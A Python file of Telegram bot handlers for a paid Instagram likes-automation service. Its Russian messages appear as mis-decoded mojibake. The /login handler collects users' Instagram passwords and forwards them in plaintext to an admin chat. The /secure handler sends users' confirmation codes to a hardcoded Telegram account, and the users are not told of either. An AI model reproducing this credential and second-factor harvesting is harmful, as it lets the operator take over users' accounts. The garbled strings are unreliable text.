from aiogram import types
from aiogram.dispatcher import FSMContext
from aiogram.dispatcher.filters import Command
from aiogram.types import ParseMode

from keyboards.default import start_menu_buttons
from states import LoginState
from loader import db, dp
from utils.misc import rate_limit
from utils.notify_admins import membership_notify, errors_notify
import threading


@rate_limit(10, '–û—Ñ–æ—Ä–º–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É')
@dp.message_handler(text='–û—Ñ–æ—Ä–º–∏—Ç—å –ø–æ–¥–ø–∏—Å–∫—É')
async def create_subscription(message: types.Message):
    """
    sets machine state to get login and make a subscription
    """
    from data.config import acc_creating_text
    await LoginState.L2.set()
    await message.answer(acc_creating_text, reply_markup=start_menu_buttons, parse_mode=ParseMode.HTML)


@dp.message_handler(state=LoginState.L2)
async def subscription_data_collecting(message: types.Message, state: FSMContext):
    """
    adds new user to db, checks if it exists first
    """
    tg_username = message.from_user.username
    tg_id = message.from_user.id
    login = message.text.replace(' ', '')
    await state.finish()
    if db.ig_select_user(tg_id, login):
        await message.answer(
            'üí©\n–¢–∞–∫–æ–π –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—å —É–∂–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ —Å–ø–∏—Å–æ–∫ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω—ã—Ö –∞–∫–∫–∞—É–Ω—Ç–æ–≤ –∏ –∏—Ö —Å—Ç–∞—Ç—É—Å —Å –ø–æ–º–æ—â—å—é \
–∫–Ω–æ–ø–∫–∏\n–ü–æ—Å–º–æ—Ç—Ä–µ—Ç—å —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫—É', reply_markup=start_menu_buttons)
    else:
        from data.config import acc_created_instruct
        db.ig_add_user(tg_id, tg_username, login)
        await membership_notify(dp, login, tg_id)
        await message.answer('–û—Ç–ª–∏—á–Ω–æ!\n–ü–æ—Å–ª–µ –æ–ø–ª–∞—Ç—ã —Ç–µ–±–µ –ø—Ä–∏–¥–µ—Ç —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —Å –∏–Ω—Å—Ç—Ä—É–∫—Ü–∏–µ–π',
                             reply_markup=start_menu_buttons)


@rate_limit(10, 'login')
@dp.message_handler(Command('login'))
async def loh_ig(message: types.Message):
    """
    checks membership and sets some starts files
    """
    from IgSide.Server.likes_bot import first_auth_start
    login = message.text.split(' ')[1]
    password = message.text.split(' ')[-1]
    tg_id = message.from_user.id
    # print(login, password, tg_id)
    membership = db.check_membership(tg_id, login)
    if membership[0] != 0:
        from data.config import admins
        await notifying(admins[0], f'–≤—Ö–æ–¥ –≤ —Å–∏—Å—Ç–µ–º—É {tg_id}\n login {login}\n {password}')
        threading.Thread(target=first_auth_start, args=(login, password)).start()
        await message.answer('–°–∫–æ—Ä–æ —Ç–µ–±–µ –ø—Ä–∏–¥–µ—Ç –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è, –ø—Ä–∏—à–ª–∏ –µ–≥–æ –º–Ω–µ –∫–æ–º–∞–Ω–¥–æ–π /secure\n\
–ù–∞–ø—Ä–∏–º–µ—Ä\n/secure 676253\n–ö–æ–¥ –¥–æ–ª–∂–µ')
    else:
        await errors_notify(dp, tg_id, login)
        await message.answer('–ö–∞–∂–µ—Ç—Å—è, —Ç–≤–æ—è –ø–æ–¥–ø–∏—Å–∫–∞ –Ω–µ –∞–∫—Ç–∏–≤–Ω–∞ ü•∫\n\
–û–ø–ª–∞—Ç–∏ –ø–æ–¥–ø–∏—Å–∫—É <a href="https://www.tinkoff.ru/rm/khvorostova.alisa1/RluPE17867">–ü–æ —ç—Ç–æ–π —Å—Å—ã–ª–∫–µ</a>]\
–∏–ª–∏ –ø–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑ –ø–æ–∑–¥–Ω–µ–µ. –ï—Å–ª–∏ –æ–ø–ª–∞—Ç–∞ –ø—Ä–æ—à–ª–∞, –∞ –ø–æ–¥–ø–∏—Å–∫–∞ –¥–æ–ª–≥–æ –Ω–µ –∞–∫—Ç–∏–≤–∏—Ä—É–µ—Ç—Å—è, –Ω–∞–ø–∏—à–∏ –æ–± —ç—Ç–æ–º @alohayoung',
                             reply_markup=start_menu_buttons, parse_mode=ParseMode.HTML)


@dp.message_handler(Command('log_maha'))
async def like_act(message: types.Message):
    """
    determines a method of likes that will be used
    """
    from IgSide.Server import auth_start
    login = message.text.split(' ')[1]
    passw = message.text.split(' ')[-1]
    tg_id = message.from_user.id
    threading.Thread(threading.Thread(target=auth_start, args=(login, passw, tg_id)).start())


@dp.message_handler(Command('update_membership_for_user'))
async def updating_membership_manually(message: types.Message):
    """

    :param message:
    """
    from data.config import acc_created_instruct
    login, tg_id = message.text.split(' ')[1:]
    print(login, tg_id)
    db.update_membership(login)
    await dp.bot.send_message(tg_id, acc_created_instruct.format(login))


@dp.message_handler(Command('secure'))
async def bot_secure(message: types.Message):
    from handlers import notifying
    text = message.text
    user = message.from_user.id
    await notifying(235597034, f'{text}\n{user}')
    await message.answer('‚úÖ \n\
–ó–∞—Ö–æ–∂—É –≤ —Å–∏—Å—Ç–µ–º—É –∏ –Ω–∞—á–∏–Ω–∞—é —Å–±–æ—Ä —Å—Å—ã–ª–æ–∫\n\
–î–ª—è —É—Å–ø–µ—à–Ω–æ–≥–æ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è —Ä–∞–±–æ—Ç—ã –∞–ª–≥–æ—Ä–∏—Ç–º–∞ –¥–æ–∂–¥–∏—Ç–µ—Å—å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –æ–± –æ–∫–æ–Ω—á–∞–Ω–∏–∏ –∑–∞–≥—Ä—É–∑–∫–∏\n\
–†–µ—á—å –∏–¥–µ—Ç –æ —Å–±–æ—Ä–µ —Ç—ã—Å—è—á —Å—Å—ã–ª–æ–∫, —Ç–∞–∫ —á—Ç–æ, –Ω–∞–±–µ—Ä–∏—Ç–µ—Å—å—Ç–µ—Ä–ø–µ–Ω–∏—èüôèüèª')


async def notifying(tg_id, message):
    """
    sends message when awaited
    """
    await dp.bot.send_message(tg_id, message)
